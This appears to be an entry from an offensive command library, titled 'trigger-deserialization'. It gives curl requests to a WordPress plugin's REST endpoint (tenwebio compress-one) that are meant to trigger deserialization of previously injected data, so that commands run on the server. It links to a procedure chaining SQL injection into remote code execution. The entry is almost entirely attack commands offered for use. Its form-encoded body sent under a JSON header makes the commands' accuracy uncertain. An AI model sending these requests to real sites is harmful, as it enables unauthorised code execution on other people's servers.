---
data: >-
  curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d
  'param=trigger_option' -H 'Content-Type: application/json'
tags:
  - deserialization
  - rce
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.377Z'
id: 1062fb0a-cbce-47fe-9178-7963f8d60cfb
verified: false
validated: true
submitted: true
---
# trigger-deserialization

## Command

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=trigger_option' -H 'Content-Type: application/json'
```

## Description

This command triggers the processing of the injected serialized data, causing deserialization and code execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d 'param=...'` | Parameter to invoke vulnerable function | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=trigger_option' -H 'Content-Type: application/json'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=reload_cache' -H 'Content-Type: application/json'
```

## Expected Output

Response with executed command output, e.g., system command results embedded in JSON.

## Related

- [[Related Procedure: Chain-SQLi-with-Insecure-Deserialization-for-RCE]]
